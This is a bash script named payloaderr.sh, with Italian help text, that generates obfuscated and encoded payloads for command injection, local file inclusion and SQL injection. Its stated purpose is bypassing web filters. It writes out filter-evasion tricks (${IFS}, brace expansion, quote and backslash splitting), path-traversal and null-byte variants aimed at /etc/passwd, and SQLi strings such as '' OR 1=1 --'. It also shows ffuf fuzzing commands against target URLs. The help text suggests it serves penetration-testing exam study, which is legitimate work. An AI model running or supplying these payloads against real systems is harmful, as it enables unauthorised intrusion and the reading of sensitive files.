#!/bin/bash
#
# payloaderr.sh - Unified payload generator for SQLi, LFI, Command Injection
# Combines obfuscation and encoding techniques for bypassing web filters.
# Pure bash implementation with minimal external dependencies (base64, xxd).
#
# Usage: ./payloaderr.sh -p "<payload>" [-m] [-t o|e|oe] [-v cmd|lfi|sqli]

# ------------------------------ Configuration ------------------------------

MODE="wordlist"  # wordlist (default) | manual
TYPE="oe"        # oe (default) | o | e  — ignorato se -v è impostato
VULN=""          # cmd | lfi | sqli      — modalità specializzata (opzionale)
PAYLOAD=""       # base input string     (required)

# ------------------------------ Print Function ------------------------------

# print_payload <payload> <description>
# Respects the global MODE variable.
print_payload() {
    local payload="$1"
    local description="$2"

    if [[ "$MODE" == "wordlist" ]]; then
        # Raw output: one line per payload, ready for ffuf -w
        printf '%s\n' "$payload"
    else
        # Manual mode: coloured, human-readable
        printf '\e[32m[payload]\e[0m     : %s\n' "$payload"
        if [[ -n "$description" ]]; then
            printf '\e[33m[technique]\e[0m   : %s\n' "$description"
        fi
        printf '\n'
    fi
}

# ------------------------------ Encoding Functions -------------------------

# Pure-bash URL percent-encoding (RFC 3986 unreserved chars left as-is).
url_encode() {
    local string="$1"
    local encoded="" pos c o
    for (( pos=0; pos < ${#string}; pos++ )); do
        c="${string:$pos:1}"
        case "$c" in
            [-_.~a-zA-Z0-9]) o="$c" ;;
            *) printf -v o '%%%02X' "'$c" ;;
        esac
        encoded+="$o"
    done
    printf '%s\n' "$encoded"
}

# Apply url_encode twice (bypasses single-pass decoders).
double_url_encode() {
    url_encode "$(url_encode "$1")"
}

# Base64 without line breaks.
base64_encode() {
    printf '%s' "$1" | base64 -w 0
    printf '\n'
}

# Hex encoding in SQLi format: 0x<hex>
hex_encode() {
    local hex="" i
    local str="$1"
    for (( i=0; i < ${#str}; i++ )); do
        printf -v hex '%s%02x' "$hex" "'${str:$i:1}"
    done
    printf '0x%s\n' "$hex"
}

# ------------------------------ Obfuscation Module -------------------------

# generate_obfuscations <input>
# Prints one obfuscated variant per line, preserving insertion order.
# Techniques are applied only to letter characters where appropriate
# (matching the behaviour of the original cmd_obfuscator.sh).
generate_obfuscations() {
    local input="$1"
    local -a results=()
    local word_count
    word_count=$(printf '%s' "$input" | wc -w)

    # --- Technique 1: spaces → ${IFS} ---
    local obs1
    obs1=$(printf '%s' "$input" | sed 's/ /${IFS}/g')
    results+=("$obs1|Spaces replaced with \${IFS}")

    # --- Technique 2: spaces → < (two-word commands only) ---
    if [[ "$word_count" -eq 2 ]]; then
        local obs2
        obs2=$(printf '%s' "$input" | sed 's/ /</')
        results+=("$obs2|Space replaced with input-redirect <")
    fi

    # --- Technique 3: brace expansion {cmd,arg} (two-word commands only) ---
    if [[ "$word_count" -eq 2 ]]; then
        local w1 w2
        w1=$(printf '%s' "$input" | awk '{print $1}')
        w2=$(printf '%s' "$input" | awk '{print $2}')
        results+=("{${w1},${w2}}|Brace expansion")
    fi

    # --- Technique 4: interleave single quotes between letters only ---
    # sed inserts a ' between every pair of adjacent letters.
    # Non-letter characters (spaces, slashes, dots) are left untouched.
    local obs4
    obs4=$(printf '%s' "$input" | sed "s/\([a-zA-Z]\)\([a-zA-Z]\)/\1'\2/g")
    results+=("$obs4|Single quotes between letters (removes on execution)")

    # --- Technique 5: prepend backslash to every letter ---
    local obs5
    obs5=$(printf '%s' "$input" | sed 's/\([a-zA-Z]\)/\\\1/g')
    results+=("$obs5|Backslash before each letter (shell strips it)")

    # --- Technique 6: insert \${@} between every pair of letters ---
    # \${@} expands to nothing in the target shell; breaks static string matching.
    local obs6
    obs6=$(printf '%s' "$input" | sed 's/\([a-zA-Z]\)\([a-zA-Z]\)/\1${@}\2/g')
    results+=("$obs6|Empty variable \${@} between letters")

    # --- Technique 7: split first word into two shell variables ---
    local first_word rest
    first_word=$(printf '%s' "$input" | awk '{print $1}')
    rest=$(printf '%s' "$input" | sed 's/^[^ ]* //')
    if [[ "$input" == "$rest" ]]; then
        # single-word input: rest == input after the failed substitution
        rest=""
    fi
    if [[ ${#first_word} -ge 2 ]]; then
        local X Y obs7
        X="${first_word:0:1}"
        Y="${first_word:1}"
        if [[ -n "$rest" ]]; then
            obs7="X='$X'; Y='$Y'; \${X}\${Y} $rest"
        else
            obs7="X='$X'; Y='$Y'; \${X}\${Y}"
        fi
        results+=("$obs7|Variable concatenation (X+Y reassembled at runtime)")
    fi

    # --- Technique 8: command substitution $(...) ---
    # FIX: was '(' "$input" ')' — missing the leading '$'
    results+=('$('"$input"')'"|Command substitution \$()")

    # --- Technique 9: backtick subshell ---
    results+=('`'"$input"'`'"|Backtick subshell \`cmd\`")

    # Output: strip the description tag and emit ordered, deduplicated lines.
    # We pipe through awk to deduplicate on the payload part while keeping order.
    local seen_payloads=""
    for entry in "${results[@]}"; do
        local payload="${entry%%|*}"
        local desc="${entry#*|}"
        # Skip exact duplicates (can happen when input has no spaces)
        if [[ "$seen_payloads" != *$'\x01'"$payload"$'\x01'* ]]; then
            seen_payloads+=$'\x01'"$payload"$'\x01'
            printf '%s\x1f%s\n' "$payload" "$desc"
        fi
    done
}

# ------------------------------ Encoding Module ----------------------------

# generate_encodings <input>
# Prints "payload\x1fdescription" lines, one per encoding.
generate_encodings() {
    local input="$1"
    printf '%s\x1f%s\n' "$(url_encode        "$input")" "URL Encoding"
    printf '%s\x1f%s\n' "$(double_url_encode "$input")" "Double URL Encoding"
    printf '%s\x1f%s\n' "$(base64_encode     "$input")" "Base64 Encoding"
    printf '%s\x1f%s\n' "$(hex_encode        "$input")" "Hex Encoding (SQLi 0x...)"
}

# ------------------------------ LFI Module ---------------------------------

# generate_lfi_variants <file_target>
# Input: file target es. "etc/passwd" o "/etc/passwd" (slash iniziale opzionale).
# Output: "payload\x1fdescription" — varianti strutturali del path traversal
# e bypass dei filtri più comuni, tratti dalla guida (sezione 2.2).
# L'encoding (URL, Double-URL) viene applicato separatamente dal chiamante.
generate_lfi_variants() {
    local input="$1"
    # Normalizza: rimuovi lo slash iniziale se presente, lo riaggiungiamo noi
    local file="${input#/}"
    local -a results=()

    # 1. Path assoluto diretto
    results+=("/${file}|Path assoluto (basic LFI)")

    # 2. Path traversal a varie profondità (2–8 livelli)
    # "basta esagerare" — dalla guida: ../ non va oltre /
    for depth in 2 3 4 5 6 7 8; do
        local trav=""
        for (( d=0; d<depth; d++ )); do trav+="../"; done
        results+=("${trav}${file}|Path traversal (${depth} livelli)")
    done

    # 3. Non-recursive filter bypass: ....// (filtro elimina ../ → rimane ../)
    local nr1=""
    for (( d=0; d<5; d++ )); do nr1+="....//"; done
    results+=("${nr1}${file}|Non-recursive bypass (....//)")

    # 4. Variante alternativa: ..././
    local nr2=""
    for (( d=0; d<5; d++ )); do nr2+="..././"; done
    results+=("${nr2}${file}|Non-recursive bypass (..././)")

    # 5. Variante: ...\\/
    local nr3=""
    for (( d=0; d<5; d++ )); do nr3+="...\\/"; done
    results+=("${nr3}${file}|Non-recursive bypass (...\\/)")

    # 6. Leading slash + traversal (utile con prefisso non-cartella tipo lang_)
    results+=("/../../../../${file}|Leading slash + traversal")

    # 7. Null byte (bypass appended extension — PHP < 5.4)
    results+=("../../../../${file}%00|Null byte %00 (PHP < 5.4 extension bypass)")
    results+=("../../../../${file}%00.php|Null byte %00.php (PHP < 5.4)")

    # Output deduplicated, ordered
    local seen_payloads=""
    for entry in "${results[@]}"; do
        local p="${entry%%|*}"
        local d="${entry#*|}"
        if [[ "$seen_payloads" != *$'\x01'"$p"$'\x01'* ]]; then
            seen_payloads+=$'\x01'"$p"$'\x01'
            printf '%s\x1f%s\n' "$p" "$d"
        fi
    done
}

# generate_lfi_encodings <input>
# Per LFI sono rilevanti solo URL e Double-URL encoding (non Base64/Hex).
generate_lfi_encodings() {
    local input="$1"
    printf '%s\x1f%s\n' "$(url_encode        "$input")" "URL Encoding"
    printf '%s\x1f%s\n' "$(double_url_encode "$input")" "Double URL Encoding"
}

# ------------------------------ Usage / Help -------------------------------

# Messaggio breve per errori (argomenti mancanti o errati).
usage() {
    printf 'Usage: %s -p "<payload>" [-m] [-t o|e|oe] [-v cmd|lfi|sqli]\n' "$0"
    printf 'Run    %s -h  for full documentation.\n' "$0"
    exit 1
}

# Guida completa, mostrata con -h.
show_help() {
    local B='\e[1m' G='\e[32m' Y='\e[33m' C='\e[36m' R='\e[0m'
    
    # Definiamo il testo in una variabile pulita
    local help_text="
${B}NOME${R}
    payloaderr.sh — Generatore unificato di payload per Command Injection,
                    SQL Injection e Local/Remote File Inclusion.

${B}SINOSSI${R}
    ${G}./payloaderr.sh${R} ${Y}-p \"<payload>\"${R} [${Y}-m${R}] [${Y}-t o|e|oe${R}] [${Y}-v cmd|lfi|sqli${R}]
    ${G}./payloaderr.sh${R} ${Y}-h${R}

${B}DESCRIZIONE${R}
    Unifica le tecniche di offuscamento bash e di encoding HTTP in un unico
    strumento modulare. Output grezzo (${C}wordlist${R}, default) o colorato (${C}manual${R}).
    Implementato in bash puro — dipendenze: ${C}base64${R}, ${C}awk${R}, ${C}sed${R}.

${B}OPZIONI${R}
    ${Y}-p <payload>${R}      ${B}(obbligatorio)${R}
                     Stringa base da trasformare.
                     Senza ${C}-v${R}: comando OS o payload arbitrario.
                       Es: ${C}\"cat /etc/passwd\"${R}   ${C}\"' OR 1=1 --\"${R}
                     Con ${C}-v lfi${R}: path del file target (slash iniziale opzionale).
                       Es: ${C}\"etc/passwd\"${R}   ${C}\"/etc/passwd\"${R}

    ${Y}-m${R}               Attiva modalità ${C}manual${R}: output colorato con descrizione
                     della tecnica per ogni payload. Ideale per copia-incolla
                     in Burp Suite. Senza flag: output grezzo (${C}wordlist${R}).

    ${Y}-t <tipo>${R}        Tipo di trasformazione — ignorato se ${C}-v${R} è impostato.
                     Default: ${C}oe${R}
                       ${C}o${R}   Solo offuscamento  (9 tecniche bash)
                       ${C}e${R}   Solo encoding      (URL, Double-URL, Base64, Hex)
                       ${C}oe${R}  Prodotto cartesiano: N_obf × 4_enc payload

    ${Y}-v <vuln>${R}        Modalità specializzata per tipo di vulnerabilità:
                       ${C}cmd${R}   Command Injection — aggiunge i 6 separatori di
                              comando al prodotto cartesiano.
                              Output: N_obf × 4_enc × 6_sep payload.
                              Separatori: ${C}; | & && || \\n${R}
                       ${C}lfi${R}   Local File Inclusion — genera varianti strutturali
                              del path traversal + bypass dei filtri comuni,
                              con URL e Double-URL encoding.
                              Il flag ${C}-t${R} viene ignorato.
                       ${C}sqli${R}  SQL Injection — applica solo encoding (alias di ${C}-t e${R}).
                              Il flag ${C}-t${R} viene ignorato.

    ${Y}-h${R}               Mostra questa guida ed esce.

${B}MODULO OBFUSCATION — tecniche (-t o o -t oe)${R}

    Scopo: aggirare filtri statici (regex, blacklist) lato server.
    Tecniche 4-6 agiscono solo sulle lettere; spazi e simboli restano intatti.

    ${C} #  Tecnica                    Esempio (cat /etc/passwd)${R}
    ─────────────────────────────────────────────────────────────────────
     1  Spazi → \${IFS}               cat\${IFS}/etc/passwd
     2  Spazi → < (solo 2 token)     cat</etc/passwd
     3  Brace expansion (2 token)    {cat,/etc/passwd}
     4  Apici singoli tra lettere    c'at /e'tc/p'as'sw'd
     5  Backslash prima di lettera   \\\\c\\\\a\\\\t /\\\\e\\\\t\\\\c/\\\\p\\\\a\\\\s\\\\s\\\\w\\\\d
     6  Variabile vuota \${@}          c\${@}at /e\${@}tc/...
     7  Concatenazione variabili     X='c'; Y='at'; \${X}\${Y} /etc/passwd
     8  Command substitution \$()    \$(cat /etc/passwd)
     9  Backtick subshell            \`cat /etc/passwd\`

${B}MODULO ENCODING — codifiche (-t e o -t oe)${R}

    ${C} #  Encoding               Esempio (input: ; id)${R}
    ─────────────────────────────────────────────────────────────────────
     1  URL Encoding            %3B%20id
     2  Double URL Encoding     %253B%2520id
     3  Base64                  OyBpZA==
     4  Hex SQLi (0x...)        0x3b206964

${B}MODULO CMD (-v cmd)${R}

    Prodotto cartesiano esteso: ogni obfuscation × ogni encoding × ogni separatore.
    I separatori vengono preposti al payload PRIMA dell'encoding, così che
    anche il separatore risulti correttamente codificato nell'output finale.

    ${C}Sep   URL-enc   Comportamento${R}
    ─────────────────────────────────────────────────────────────────────
    ;     %3B       Esegue in sequenza (baseline)
    |     %7C       Pipe stdout → stdin
    &     %26       Esegue in background, passa subito al 2°
    &&    %26%26    2° solo se il 1° ha successo (exit 0)
    ||    %7C%7C    2° solo se il 1° fallisce (exit ≠ 0)
    \\n    %0A       Newline — bypassa molti filtri regex primitivi

${B}MODULO LFI (-v lfi)${R}

    Genera varianti strutturali del path traversal per il file target in ${C}-p${R}.
    Applica URL e Double-URL encoding (non Base64/Hex, irrilevanti per LFI).

    ${C}Variante                              Tecnica${R}
    ─────────────────────────────────────────────────────────────────────
    /etc/passwd                           Path assoluto (basic LFI)
    ../../etc/passwd  (profondità 2–8)    Path traversal
    ....//....//etc/passwd                Non-recursive bypass (....///)
    ..././..././etc/passwd                Non-recursive bypass (..././)
    ...\\\\/...\\\\/etc/passwd               Non-recursive bypass (...\\\\/)
    /../../../../etc/passwd               Leading slash + traversal
    ../../../../etc/passwd%00             Null byte (PHP < 5.4)

    + URL Encoding e Double-URL Encoding di ogni variante sopra.

${B}ESEMPI${R}

    # Command Injection — wordlist completa con separatori per ffuf:
    ${G}./payloaderr.sh -p \"id\" -v cmd | ffuf -w - -u \"http://TARGET/ping?ip=FUZZ\" -fs 512${R}

    # Command Injection — ispezione manuale delle varianti:
    ${G}./payloaderr.sh -p \"cat /etc/passwd\" -v cmd -m${R}

    # LFI — wordlist path traversal per ffuf:
    ${G}./payloaderr.sh -p \"etc/passwd\" -v lfi | ffuf -w - -u \"http://TARGET/index.php?language=FUZZ\" -fs 1250${R}

    # SQLi — solo encoding, output colorato:
    ${G}./payloaderr.sh -p \"' OR 1=1 --\" -v sqli -m${R}

    # Generico — prodotto cartesiano (default), wordlist per ffuf:
    ${G}./payloaderr.sh -p \"cat /etc/passwd\" | ffuf -w - -u \"http://TARGET/stat?file=FUZZ\" -fs 1250${R}

    # Solo offuscamento, output colorato:
    ${G}./payloaderr.sh -p \"cat /etc/passwd\" -t o -m${R}

${B}WORKFLOW IN ESAME${R}

    ${B}Command Injection:${R}
      1. Identifica l'input atteso (es. IP, filename).
      2. Esplora manualmente: ${C}./payloaderr.sh -p \"id\" -v cmd -m${R}
      3. Se non funziona nulla, fuzza: ${C}./payloaderr.sh -p \"id\" -v cmd | ffuf ...${R}

    ${B}LFI:${R}
      1. Identifica il parametro vulnerabile e il file target.
      2. Fuzza direttamente: ${C}./payloaderr.sh -p \"etc/passwd\" -v lfi | ffuf ...${R}
      3. Usa ${C}-fs${R} per filtrare la dimensione della risposta di errore.

    ${B}SQLi:${R}
      1. Costruisci il payload a mano guardando la struttura della query.
      2. Encodalo: ${C}./payloaderr.sh -p \"admin'-- -\" -v sqli -m${R}
"

    # Usando '%b' permettiamo a printf di interpretare \e come colori,
    # ma passando la stringa come argomento, ignoriamo i simboli '%' interni.
    printf '%b\n' "$help_text"
    exit 0
}

# ------------------------------ Argument Parsing ---------------------------

while getopts ":p:mt:v:h" opt; do
    case $opt in
        p) PAYLOAD="$OPTARG"  ;;
        m) MODE="manual"      ;;
        t) TYPE="$OPTARG"     ;;
        v) VULN="$OPTARG"     ;;
        h) show_help          ;;
        \?) printf 'Unknown option: -%s\n' "$OPTARG" >&2; usage ;;
        :)  printf 'Option -%s requires an argument.\n' "$OPTARG" >&2; usage ;;
    esac
done

# Validate required flags
if [[ -z "$PAYLOAD" ]]; then
    printf 'Error: -p is required.\n' >&2; usage
fi
if [[ -n "$VULN" && "$VULN" != "cmd" && "$VULN" != "lfi" && "$VULN" != "sqli" ]]; then
    printf 'Error: -v must be "cmd", "lfi", or "sqli".\n' >&2; usage
fi
# -t is only validated when -v is not set
if [[ -z "$VULN" && "$TYPE" != "o" && "$TYPE" != "e" && "$TYPE" != "oe" ]]; then
    printf 'Error: -t must be "o", "e", or "oe".\n' >&2; usage
fi

# ------------------------------ Header (manual mode only) ------------------

if [[ "$MODE" == "manual" ]]; then
    local_vuln="${VULN:+ | vuln: $VULN}"
    printf '\e[1;34m=== payloaderr.sh | payload: "%s" | type: %s%s ===\e[0m\n\n' \
        "$PAYLOAD" "$TYPE" "$local_vuln"
fi

# ------------------------------ Main Dispatch ------------------------------

# Helper: cartesian product obfuscation × encoding (usato da oe e da _run_cmd).
_run_oe() {
    local payload="$1"
    declare -a obf_payloads=() obf_descs=()
    while IFS=$'\x1f' read -r p d; do
        [[ -z "$p" ]] && continue
        obf_payloads+=("$p"); obf_descs+=("$d")
    done < <(generate_obfuscations "$payload")

    declare -A seen=()
    for (( i=0; i < ${#obf_payloads[@]}; i++ )); do
        local obs="${obf_payloads[$i]}" obs_desc="${obf_descs[$i]}"
        while IFS=$'\x1f' read -r enc_p enc_d; do
            [[ -z "$enc_p" ]] && continue
            if [[ -z "${seen[$enc_p]}" ]]; then
                seen["$enc_p"]=1
                print_payload "$enc_p" "${obs_desc} → ${enc_d}"
            fi
        done < <(generate_encodings "$obs")
    done
}

# -v cmd: prodotto cartesiano obf × enc × sep
_run_cmd() {
    local payload="$1"
    # 6 separatori dalla tabella 2.1 della guida
    local -a sep_chars=(';' '|' '&' '&&' '||' $'\n')
    local -a sep_descs=('sep ;' 'sep |' 'sep &' 'sep &&' 'sep ||' 'sep \n (newline)')

    declare -a obf_payloads=() obf_descs=()
    while IFS=$'\x1f' read -r p d; do
        [[ -z "$p" ]] && continue
        obf_payloads+=("$p"); obf_descs+=("$d")
    done < <(generate_obfuscations "$payload")

    declare -A seen=()
    for (( s=0; s < ${#sep_chars[@]}; s++ )); do
        local sep="${sep_chars[$s]}" sep_desc="${sep_descs[$s]}"
        for (( i=0; i < ${#obf_payloads[@]}; i++ )); do
            # Il separatore viene preposto PRIMA dell'encoding:
            # risulterà correttamente codificato nell'output finale.
            local combined="${sep}${obf_payloads[$i]}"
            local combined_desc="${sep_desc} + ${obf_descs[$i]}"
            while IFS=$'\x1f' read -r enc_p enc_d; do
                [[ -z "$enc_p" ]] && continue
                if [[ -z "${seen[$enc_p]}" ]]; then
                    seen["$enc_p"]=1
                    print_payload "$enc_p" "${combined_desc} → ${enc_d}"
                fi
            done < <(generate_encodings "$combined")
        done
    done
}

# -v lfi: varianti path traversal × URL/Double-URL encoding
_run_lfi() {
    local payload="$1"
    declare -a lfi_payloads=() lfi_descs=()
    while IFS=$'\x1f' read -r p d; do
        [[ -z "$p" ]] && continue
        lfi_payloads+=("$p"); lfi_descs+=("$d")
    done < <(generate_lfi_variants "$payload")

    declare -A seen=()
    for (( i=0; i < ${#lfi_payloads[@]}; i++ )); do
        local lfi_p="${lfi_payloads[$i]}" lfi_d="${lfi_descs[$i]}"
        # Variante raw
        if [[ -z "${seen[$lfi_p]}" ]]; then
            seen["$lfi_p"]=1
            print_payload "$lfi_p" "$lfi_d"
        fi
        # URL Encoding e Double-URL Encoding
        while IFS=$'\x1f' read -r enc_p enc_d; do
            [[ -z "$enc_p" ]] && continue
            if [[ -z "${seen[$enc_p]}" ]]; then
                seen["$enc_p"]=1
                print_payload "$enc_p" "${lfi_d} → ${enc_d}"
            fi
        done < <(generate_lfi_encodings "$lfi_p")
    done
}

if [[ -n "$VULN" ]]; then
    case "$VULN" in
        cmd)  _run_cmd  "$PAYLOAD" ;;
        lfi)  _run_lfi  "$PAYLOAD" ;;
        sqli)
            while IFS=$'\x1f' read -r p d; do
                [[ -z "$p" ]] && continue
                print_payload "$p" "$d"
            done < <(generate_encodings "$PAYLOAD")
            ;;
    esac
else
    case "$TYPE" in
        o)
            while IFS=$'\x1f' read -r p d; do
                [[ -z "$p" ]] && continue; print_payload "$p" "$d"
            done < <(generate_obfuscations "$PAYLOAD")
            ;;
        e)
            while IFS=$'\x1f' read -r p d; do
                [[ -z "$p" ]] && continue; print_payload "$p" "$d"
            done < <(generate_encodings "$PAYLOAD")
            ;;
        oe)
            _run_oe "$PAYLOAD"
            ;;
    esac
fi
